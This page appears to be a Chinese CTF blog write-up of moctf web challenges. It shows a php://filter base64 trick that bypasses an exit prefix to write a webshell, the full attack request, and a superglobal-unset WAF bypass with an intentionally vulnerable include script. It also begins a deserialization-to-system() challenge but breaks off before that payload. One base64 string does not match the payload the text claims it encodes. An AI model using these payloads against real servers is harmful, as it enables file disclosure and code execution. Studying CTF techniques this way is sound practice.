@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="本人渣渣，于是记录一下 死亡退出一道代码审计题目 123456789101112&amp;lt;?php  show_source(__FILE__);  $c=&quot;&amp;lt;?php exit;?&amp;gt;&quot;;  @$c.=$_POST[&apos;c&apos;];  @$filename=$_POST[&apos;file&apos;];   if(!isset($filename))                      &amp;#123;">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单小结一下moctf的两道web题">
+<meta property="og:url" content="http://0verwatch.top/2018/03/06/moctfweb/index.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="本人渣渣，于是记录一下 死亡退出一道代码审计题目 123456789101112&amp;lt;?php  show_source(__FILE__);  $c=&quot;&amp;lt;?php exit;?&amp;gt;&quot;;  @$c.=$_POST[&apos;c&apos;];  @$filename=$_POST[&apos;file&apos;];   if(!isset($filename))                      &amp;#123;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20180306231007347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9oluIP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9olnat.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9olMPf.png">
+<meta property="og:updated_time" content="2018-04-16T14:39:10.789Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="简单小结一下moctf的两道web题">
+<meta name="twitter:description" content="本人渣渣，于是记录一下 死亡退出一道代码审计题目 123456789101112&amp;lt;?php  show_source(__FILE__);  $c=&quot;&amp;lt;?php exit;?&amp;gt;&quot;;  @$c.=$_POST[&apos;c&apos;];  @$filename=$_POST[&apos;file&apos;];   if(!isset($filename))                      &amp;#123;">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20180306231007347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>简单小结一下moctf的两道web题 | 0verWatch&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:kd08163314@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/0v3rWatch" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:kd08163314@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/0v3rWatch" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-moctfweb" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/03/06/moctfweb/" class="article-date">
+      <time datetime="2018-03-06T15:14:34.000Z" itemprop="datePublished">2018-03-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      简单小结一下moctf的两道web题
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>本人渣渣，于是记录一下</p>
+<h2 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h2><p>一道代码审计题目</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];</span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); </span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>来看看代码，@是用来忽略错误<br>这段代码是利用最后的include执行temp.php,那么我们很快九形道运用伪协议把它给读出来。。但前提是要绕过<code>&quot;&lt;?php exit;?&gt;&quot;</code>;不然会直接退出</p>
+<p>这里搜到一篇文章用base64绕过的一篇文章<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>这一题我本来是想用<code>print_r(&#39;flag.php&#39;)</code>构造的，发现不行，查了查手册发现是自己理解函数有问题<br>于是参考了方方土学长的构造，我使用<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br>base64编码之后<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p>
+<p>然后    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure>
+<p>post参数c的时候会在<code>&lt;?php exit;?&gt;</code>后面加一些东西<br>所以会变成这个样子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
+<p>然后经过base64decode之后就变成了下面的那个样子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^?Z&lt;?php system(&apos;cat flag.php&apos;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>注意我的base64为什么前面多了个a，那是因为<br>在解码的过程中，字符<code>&lt;、?、;、&gt;、</code>空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“<code>phpexit</code>”和我们传入的其他字符。<br>而phpexit一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p>
+<p>不知道为什么，最近用bp发包都搞不了这题，我是用火狐自带Hackbar发送post数据才在控制台下面看到的flag<br>我也很是奇怪。。。。用bp抓一下包用其comparer功能对比之后发现改的包没啥差异。。。。以后还是抓包还是先过一遍hackbar吧。。emmmm</p>
+<p>最后经过Hackbar截的包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://d734739a-e2f8-430e-8dc3-796d3187dbc2</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure>
+<h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>这道题目也是多亏了方方土学长指导我仔细看清楚这个漏洞，最后终于明白了</p>
+<p>这个主要是利用了Destoon 20140530最新版超全局变量覆盖导致的安全问题<br>这是网址:<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">http://www.secevery.com:4321/bugs/wooyun-2014-063895</a></p>
+<p>如果 post get cookie 请求中的<code>$$key</code>和<code>$value</code>相等 就unset掉<code>$$key</code><br>如果我们向1.php?x=1提交一个POST请求 内容为<code>_GET[x]=1</code><br>因为?x=1 所以<code>$_GET</code>内容为 <code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code>,但是这里没什么关系，如果没传post参数上去的话，遍历到第一个key的时候就会符合正则继而执行exit。。。。。这个自己尝试</p>
+<p>如果传参post上去的话，当开始遍历<code>$_POST</code>的时候 <code>$__k</code>是<code>_GET[x]</code> 所以<code>$$__k</code> 就是<code>$_GET[x]</code>也就是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$__v</code>是POST上来的一个数组 内容也是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$$__k == $__v</code>成立<br>所以 ,我们的超全局变量 <code>$_GET</code>就这么华丽丽的被unset了。。。</p>
+<p>没关系，我们的目的就是为了绕过get时候到的waf，由于我们的<code>$_GET</code>已经在前面被unset了 所以即使加了<code>EXTR_SKIP extract($_GET)</code>仍然能够正常的初始化<br><code>$_GET extract($_GET)</code>的值就成功绕过了waf的检查<br>如果单单传参post上去的话，只能实例化<code>$_POST[_GET[]]</code>,所以还得传GET参数，不然到了<code>$_GET extract($_GET)</code>就不<br>能实例化$GET了</p>
+<p>最后我们只要利用MD5的漏洞还有php伪协议就能够把file读出来了</p>
+<p>这是自己在本机搭建的测试源代码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $key;</span><br><span class="line">        	<span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line"></span><br><span class="line">        	<span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">									&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        		&#125;</span><br><span class="line">    		 &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">    <span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	<span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload：<br><img src="http://img.blog.csdn.net/20180306231007347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p>
+<h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><p>一打开是吃鸡的图片。。还有几个按钮，都点一下试一试，都查看一波源码<br>发现在学校的按钮下面的源码发现了index.php.bak，好家伙源码泄露<br>点开发现代码泄露</p>
+<p>关键代码是下面这部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($pos===<span class="string">"school"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html"  style="color:white"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'</span>);</span><br><span class="line">            $pubg=$_GET[<span class="string">'pubg'</span>];</span><br><span class="line">            $p = unserialize($pubg);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>看到unserialize函数猜想应该是反序列化的题目，同样的招式再看看那一个class.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"nothing"</span>;</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"M24"</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str="You got the airdrop";</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bag=<span class="string">"nothing"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;weapon=<span class="string">"kar98K"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$b();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method,$parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $file = explode(<span class="string">"."</span>,$method);</span><br><span class="line">            <span class="keyword">echo</span> $file[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="string">".//class$file[0].php"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//$method.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//win.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;center&gt;You lose&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            waf(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;weapon===<span class="string">'AWM'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Get_air_drops(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现这段代码还有个waf.php，再来一次发现不行了，那就先构造一波吧<br>首先我们发现system函数，这里可以利用，但是在<code>__call()</code>函数里面，我们应该知道<code>__call()</code>函数应该在类里面调用一个未定义的函数的时候使用<br>这里是利用bag参数去实现这一功能，毕竟到了Get_air_drops()函数里面我们就会调用一个没定义的函数了，因为bag参数对于我们而言是可控的<br>而在调用__call函数的时候，method变量对应就是bag参数的值了。。。。</p>
+<p>所以我们先构造类</p>
